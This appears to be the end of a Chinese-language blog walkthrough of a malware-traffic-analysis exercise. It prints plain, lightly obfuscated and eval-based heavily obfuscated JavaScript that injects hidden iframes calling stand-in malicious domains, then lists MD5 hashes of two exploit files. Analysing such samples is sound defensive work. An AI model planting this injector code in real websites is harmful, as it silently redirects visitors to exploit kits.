<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showBrowVer</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> data = browserDetectNav();      </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (data[<span class="number">0</span>]) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((data[<span class="number">0</span>] == <span class="string">'Opera'</span> || data[<span class="number">0</span>] == <span class="string">'MSIE'</span> || data[<span class="number">0</span>] == <span class="string">'Firefox'</span>) &amp; data[<span class="number">3</span>] == <span class="string">'Windows'</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> divTag=<span class="built_in">document</span>.createElement(<span class="string">'div'</span>);        </span><br><span class="line">divTag.id=<span class="string">'dt'</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(divTag);</span><br><span class="line">                  <span class="keyword">var</span> js_kod2 = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">              js_kod2.src = <span class="string">'http://malicious-domain.com/?2'</span>;</span><br><span class="line">              js_kod2.width = <span class="string">'5px'</span>;                  </span><br><span class="line">              js_kod2.height = <span class="string">'3px'</span>;                </span><br><span class="line">              js_kod2.setAttribute(<span class="string">'style'</span>,<span class="string">'visibility:hidden'</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'dt'</span>).appendChild(js_kod2);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外一种是对js注入iframe相关的代码进行轻微混淆：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">... slightly obfuscated ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tds_url = <span class="string">'ht'</span> + <span class="string">'tp:'</span> + <span class="string">'//'</span> + <span class="string">'xx.'</span> + <span class="string">'xxx.'</span> + <span class="string">'xx.'</span> + <span class="string">'xxx'</span> + <span class="string">'/'</span>;</span><br><span class="line"><span class="keyword">var</span> group = <span class="string">'?'</span> + <span class="string">'i'</span> + <span class="string">'d'</span> + <span class="string">'='</span> + <span class="string">'1'</span>;</span><br><span class="line"><span class="keyword">var</span> charset = <span class="string">'utf-8'</span>;</span><br><span class="line"><span class="keyword">var</span> referer = <span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.referrer);</span><br><span class="line"><span class="keyword">var</span> url = tds_url + <span class="string">'/'</span> + group + <span class="string">'&amp;se_referer='</span> + referer + <span class="string">'&amp;charset='</span> + charset;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;'</span> + <span class="string">'i'</span> + <span class="string">'f'</span> + <span class="string">'r'</span> + <span class="string">'a'</span> + <span class="string">'m'</span> + <span class="string">'e'</span> + <span class="string">' '</span> + <span class="string">'w'</span> + <span class="string">'i'</span> + <span class="string">'d'</span> + <span class="string">'t'</span> + <span class="string">'h'</span> + <span class="string">'='</span> + <span class="string">'"'</span> + <span class="string">'0'</span> + <span class="string">'"'</span> + <span class="string">' '</span> + <span class="string">'h'</span> + <span class="string">'e'</span> + <span class="string">'i'</span> + <span class="string">'g'</span> + <span class="string">'h'</span> + <span class="string">'t'</span> + <span class="string">'='</span> + <span class="string">'"'</span> + <span class="string">'0'</span> + <span class="string">'"'</span> + <span class="string">' '</span> + <span class="string">'f'</span> + <span class="string">'r'</span> + <span class="string">'a'</span> + <span class="string">'m'</span> + <span class="string">'e'</span> + <span class="string">'b'</span> + <span class="string">'o'</span> + <span class="string">'r'</span> + <span class="string">'d'</span> + <span class="string">'e'</span> + <span class="string">'r'</span> + <span class="string">'='</span> + <span class="string">'"'</span> + <span class="string">'0'</span> + <span class="string">'"'</span> + <span class="string">' '</span> + <span class="string">'s'</span> + <span class="string">'c'</span> + <span class="string">'r'</span> + <span class="string">'o'</span> + <span class="string">'l'</span> + <span class="string">'l'</span> + <span class="string">'i'</span> + <span class="string">'n'</span> + <span class="string">'g'</span> + <span class="string">'='</span> + <span class="string">'"'</span> + <span class="string">'n'</span> + <span class="string">'o'</span> + <span class="string">'"'</span> + <span class="string">' '</span> + <span class="string">'s'</span> + <span class="string">'r'</span> + <span class="string">'c'</span> + <span class="string">'="'</span> + url + <span class="string">'"&gt;'</span> + <span class="string">'&lt;'</span> + <span class="string">'/'</span> + <span class="string">'i'</span> + <span class="string">'f'</span> + <span class="string">'r'</span> + <span class="string">'a'</span> + <span class="string">'m'</span> + <span class="string">'e'</span> + <span class="string">'&gt;'</span>);</span><br></pre></td></tr></table></figure>

<p>心眼更多一点的攻击者就会对js代码进行比较复杂的混淆：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">... or heavily obfuscated ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*fe9ee021ca8b75385556d8588e76ae28*/</span><span class="keyword">try</span>&#123;<span class="built_in">document</span>[<span class="string">"b"</span>+<span class="string">"ody"</span>]*=<span class="built_in">document</span>&#125;<span class="keyword">catch</span>(dgsgsdg)&#123;zxc=<span class="number">1</span>;ww=<span class="built_in">window</span>;&#125;<span class="keyword">try</span>&#123;d=<span class="built_in">document</span>[<span class="string">"createElement"</span>](<span class="string">"span"</span>);&#125;<span class="keyword">catch</span>(agdsg)&#123;zxc=<span class="number">0</span>;&#125;<span class="keyword">try</span>&#123;<span class="keyword">if</span>(ww.document)<span class="built_in">window</span>[<span class="string">"doc"</span>+<span class="string">"ument"</span>][<span class="string">"body"</span>]=<span class="string">"zxc"</span>&#125;<span class="keyword">catch</span>(bawetawe)&#123;<span class="keyword">if</span>(ww.document)&#123;v=<span class="built_in">window</span>;n=[<span class="string">"3o"</span>,<span class="string">"4d"</span>,<span class="string">"46"</span>,<span class="string">"3l"</span>,<span class="string">"4c"</span>,<span class="string">"41"</span>,<span class="string">"47"</span>,<span class="string">"46"</span>,<span class="string">"16"</span>,<span class="string">"3p"</span>,<span class="string">"4a"</span>,... skipped ...,<span class="string">"2j"</span>,<span class="string">"2p"</span>,<span class="string">"36"</span>,<span class="string">"35"</span>,<span class="string">"4c"</span>,<span class="string">"4a"</span>,<span class="string">"41"</span>,<span class="string">"46"</span>,<span class="string">"3p"</span>,<span class="string">"1e"</span>,<span class="string">"1f"</span>,<span class="string">"27"</span>,<span class="string">"d"</span>,<span class="string">"a"</span>,<span class="string">"4l"</span>];h=<span class="number">2</span>;s=<span class="string">""</span>;<span class="keyword">if</span>(zxc)&#123;<span class="keyword">for</span>(i=<span class="number">0</span>;i<span class="number">-609</span>!=<span class="number">0</span>;i++)&#123;k=i;s+=<span class="built_in">String</span>.fromCharCode(<span class="built_in">parseInt</span>(n[i],<span class="number">26</span>));&#125;z=s;vl=<span class="string">"val"</span>;<span class="keyword">if</span>(ww.document)ww[<span class="string">"e"</span>+vl](z)&#125;&#125;&#125;<span class="comment">/*fe9ee021ca8b75385556d8588e76ae28*/</span></span><br></pre></td></tr></table></figure>

<p>对应的js源码为：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;style&gt;.s'</span>+stnm+<span class="string">' &#123; position:absolute; left:-'</span>+gra(<span class="number">600</span>,<span class="number">1000</span>)+<span class="string">'px; top:-'</span>+gra(<span class="number">600</span>,<span class="number">1000</span>)+<span class="string">'px; &#125;&lt;/style&gt; &lt;div class="s'</span>+stnm+<span class="string">'"&gt;&lt;iframe src="http://malicious-domain.org/ad/feed.php" width="'</span>+gra(<span class="number">300</span>,<span class="number">600</span>)+<span class="string">'" height="'</span>+gra(<span class="number">300</span>,<span class="number">600</span>)+<span class="string">'"&gt;&lt;/iframe&gt;&lt;/div&gt;'</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Problem-12"><a href="#Problem-12" class="headerlink" title="Problem 12"></a>Problem 12</h3><blockquote>
<p>*<em>Extract the two exploit files. What are the MD5 file hashes? (comma-separated ) *</em></p>
</blockquote>
<p>提取出这两个恶意软件，然后计算md5值，得到的结果分别为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Swf.Exploit.Rig    : 7b3baa7d6bb3720f369219789e38d6ab</span><br><span class="line">java.Malware.Agent : 1e34fdebbf655cebea78b45e43520ddf</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://labs.sucuri.net/signatures/malwares/js-malware-hidden-iframe-006/" target="_blank" rel="noopener">https://labs.sucuri.net/signatures/malwares/js-malware-hidden-iframe-006/</a></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Bantian</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>早睡早起身体好</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Malware-Traffic/"># Malware Traffic</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2021/08/01/MalwareTrafficAnalysis1/">流量分析系列之Malware-Traffic-上</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
